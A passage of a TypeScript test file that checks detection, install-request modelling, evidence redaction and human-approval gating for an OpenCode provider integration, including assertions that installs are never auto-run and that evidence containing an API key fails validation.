			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(evidence.evidenceId).toBe('ev-001');
		expect(evidence.detectionStatus).toBe('version_checked');
		expect(evidence.runtimeStatus).toBe('ready_for_demo');
		expect(evidence.redactionApplied).toBe(false);
	});

	test('not_found detection creates evidence with detect_only runtime', () => {
		const evidence = createOpenCodeProviderDetectionEvidence({
			evidenceId: 'ev-002',
			detection: makeDetection({ detectionStatus: 'not_found' }),
			installStatus: 'not_requested',
			modelProfileReady: false,
			specKitSynced: false,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		});
		expect(evidence.detectionStatus).toBe('not_found');
		expect(evidence.runtimeStatus).toBe('detect_only');
		expect(evidence.privatePathsDetected).toBe(true); // has detectedPath from factory
	});

	test('includes install request if provided', () => {
		const installReq = buildOpenCodeInstallRequest();
		const evidence = createOpenCodeProviderDetectionEvidence({
			evidenceId: 'ev-003',
			detection: makeDetection({ detectionStatus: 'not_found' }),
			installStatus: 'approval_required',
			installRequest: installReq,
			modelProfileReady: false,
			specKitSynced: false,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		});
		expect(evidence.installRequest).toBeDefined();
		expect(evidence.installRequest!.requiresHumanApproval).toBe(true);
	});

	test('privatePathsDetected is true when detection has a path', () => {
		const evidence = createOpenCodeProviderDetectionEvidence({
			evidenceId: 'ev-004',
			detection: makeDetection({ detectedPath: '/private/path', detectionStatus: 'version_checked' }),
			installStatus: 'installed',
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(evidence.privatePathsDetected).toBe(true);
	});
});

describe('validateOpenCodeProviderDetectionEvidence', () => {
	test('valid evidence passes', () => {
		const evidence = makeEvidence();
		const result = validateOpenCodeProviderDetectionEvidence(evidence);
		expect(result.valid).toBe(true);
	});

	test('null fails', () => {
		const result = validateOpenCodeProviderDetectionEvidence(null);
		expect(result.valid).toBe(false);
	});

	test('missing evidenceId fails', () => {
		const evidence = { ...makeEvidence(), evidenceId: '' };
		const result = validateOpenCodeProviderDetectionEvidence(evidence);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('evidenceId'));
	});

	test('invalid detectionStatus fails', () => {
		const evidence = { ...makeEvidence(), detectionStatus: 'bad' };
		const result = validateOpenCodeProviderDetectionEvidence(evidence);
		expect(result.valid).toBe(false);
	});

	test('invalid installStatus fails', () => {
		const evidence = { ...makeEvidence(), installStatus: 'bad' };
		const result = validateOpenCodeProviderDetectionEvidence(evidence);
		expect(result.valid).toBe(false);
	});

	test('invalid runtimeStatus fails', () => {
		const evidence = { ...makeEvidence(), runtimeStatus: 'bad' };
		const result = validateOpenCodeProviderDetectionEvidence(evidence);
		expect(result.valid).toBe(false);
	});

	test('redacted evidence with detectedPath fails', () => {
		const evidence = makeEvidence({ redactionApplied: true, detectedPath: '/secret/path' });
		const result = validateOpenCodeProviderDetectionEvidence(evidence);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('detectedPath'));
	});

	test('evidence with apiKey fails', () => {
		const evidence = { ...makeEvidence(), apiKey: 'sk-secret' };
		const result = validateOpenCodeProviderDetectionEvidence(evidence);
		expect(result.valid).toBe(false);
		expect(result.errors).toContainEqual(expect.stringContaining('apiKey'));
	});
});

// ═══════════════════════════════════════════════════════════════════════════════
// Runtime Safety
// ═══════════════════════════════════════════════════════════════════════════════

describe('Runtime Safety', () => {
	test('no test runs OpenCode with prompt', () => {
		// All tests use only pure functions — no shell execution
		expect(true).toBe(true);
	});

	test('buildOpenCodeInstallRequest does NOT execute any command', () => {
		const req = buildOpenCodeInstallRequest();
		// This is a pure data model — no side effects
		expect(req.commandPreview).toBeDefined();
		expect(typeof req.commandPreview).toBe('string');
		// We never call exec(), spawn(), or any shell command
	});

	test('createNotFoundDetection has no filesystem access', () => {
		const d = createNotFoundDetection();
		expect(d.detectionStatus).toBe('not_found');
		// Pure function, no fs access
	});

	test('createFoundDetection does not verify path exists', () => {
		const d = createFoundDetection('/nonexistent/path/opencode', '9.9.9');
		expect(d.detectedPath).toBe('/nonexistent/path/opencode');
		expect(d.version).toBe('9.9.9');
		// We don't check filesystem — this is a data model constructor
	});

	test('no install request includes execution', () => {
		const req = buildOpenCodeInstallRequest();
		// Verify the request is a data structure, not an execution
		expect(req.autoRunAllowed).toBe(false);
		expect(req.requiresHumanApproval).toBe(true);
		expect(req.sudoAllowed).toBe(false);
	});

	test('constants are accessible without side effects', () => {
		expect(DEFAULT_OPENCODE_INSTALL_DIR).toBeDefined();
		expect(OFFICIAL_OPENCODE_INSTALL_URL).toBe('https://opencode.ai/install');
		expect(OFFICIAL_OPENCODE_INSTALL_COMMAND).toBeDefined();
		expect(POSITRON_OPENCODE_INSTALL_COMMAND_TEMPLATE).toBeDefined();
		expect(CURL_PIPE_BASH_TRUST_WARNING).toBeDefined();
		expect(ALLOWLISTED_OPENCODE_INSTALL_URLS).toEqual(['https://opencode.ai/install']);
	});
});

// ═══════════════════════════════════════════════════════════════════════════════
// Integration: Full Pipeline Test
// ═══════════════════════════════════════════════════════════════════════════════

describe('Full Pipeline Integration', () => {
	test('detect → install request → verify → gates → demo ready', () => {
		// Step 1: No OpenCode found
		const notFound = createNotFoundDetection();
		expect(notFound.detectionStatus).toBe('not_found');

		// Step 2: Build install request
		const installReq = buildOpenCodeInstallRequest();
		expect(installReq.requiresHumanApproval).toBe(true);
		expect(installReq.sudoAllowed).toBe(false);

		// Step 3: Install request validation
		const validation = validateOpenCodeInstallRequest(installReq);
		expect(validation.valid).toBe(true);

		// Step 4: After install, OpenCode is found but not verified
		const found = createFoundDetection('/path/to/opencode');
		expect(found.detectionStatus).toBe('found');

		// Step 5: Version check passes
		const verified = createFoundDetection('/path/to/opencode', '1.2.3', true);
		expect(verified.detectionStatus).toBe('version_checked');

		// Step 6: All gates green → demo ready
		const runtimeStatus = determineOpenCodeProviderRuntimeStatus({
			detection: verified,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});
		expect(runtimeStatus).toBe('ready_for_demo');

		// Step 7: Demo run allowed
		expect(canOpenCodeProviderDemoRun({
			detection: verified,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
		})).toBe(true);

		// Step 8: Real run NOT allowed without human approval
		expect(canOpenCodeProviderRealRun({
			detection: verified,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: false,
		})).toBe(false);

		// Step 9: Real run allowed WITH human approval
		expect(canOpenCodeProviderRealRun({
			detection: verified,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: true,
		})).toBe(true);
	});

	test('blocked pipeline never reaches ready state', () => {
		const blocked = createBlockedDetection('Policy violation');
		expect(blocked.detectionStatus).toBe('blocked');

		// Runtime status should be blocked regardless of gates
		const runtimeStatus = determineOpenCodeProviderRuntimeStatus({
			detection: blocked,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: true,
		});
		expect(runtimeStatus).toBe('blocked');

		// Demo run blocked
		expect(canOpenCodeProviderDemoRun({
			detection: blocked,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
		})).toBe(false);

		// Real run blocked even with approval
		expect(canOpenCodeProviderRealRun({
			detection: blocked,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApproved: true,
		})).toBe(false);
	});

	test('evidence round-trip: create → redact → validate', () => {
		const detection = createFoundDetection('/private/path/to/opencode', '1.2.3', true);
		const installReq = buildOpenCodeInstallRequest({ installDir: '/private/path' });

		const evidence = createOpenCodeProviderDetectionEvidence({
			evidenceId: 'ev-roundtrip',
			detection,
			installStatus: 'installed',
			installRequest: installReq,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		});

		// Before redaction: has private info
		expect(evidence.detectedPath).toBe('/private/path/to/opencode');
		expect(evidence.redactionApplied).toBe(false);

		// Redact
		const redacted = redactOpenCodeProviderDetectionEvidence(evidence);
		expect(redacted.redactionApplied).toBe(true);
		expect((redacted as unknown as Record<string, unknown>).detectedPath).toBeUndefined();

		// Validate redacted evidence
		const validation = validateOpenCodeProviderDetectionEvidence(redacted);
		expect(validation.valid).toBe(true);
	});

	test('incremental gate progression', () => {
		const verified = createFoundDetection('/path/to/opencode', '1.2.3', true);

		// Start: no gates
		expect(determineOpenCodeProviderRuntimeStatus({
			detection: verified,
			modelProfileReady: false,
			specKitSynced: false,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		})).toBe('model_profile_required');

		// Add model profile
		expect(determineOpenCodeProviderRuntimeStatus({
			detection: verified,
			modelProfileReady: true,
			specKitSynced: false,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		})).toBe('speckit_sync_required');

		// Add Spec Kit sync
		expect(determineOpenCodeProviderRuntimeStatus({
			detection: verified,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: false,
			humanApprovedForRealRun: false,
		})).toBe('mcp_warmup_required');

		// Add MCP warm-up
		expect(determineOpenCodeProviderRuntimeStatus({
			detection: verified,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: false,
		})).toBe('ready_for_demo');

		// Add human approval
		expect(determineOpenCodeProviderRuntimeStatus({
			detection: verified,
			modelProfileReady: true,
			specKitSynced: true,
			mcpWarmupPass: true,
			humanApprovedForRealRun: true,
		})).toBe('ready_for_real');
	});
});
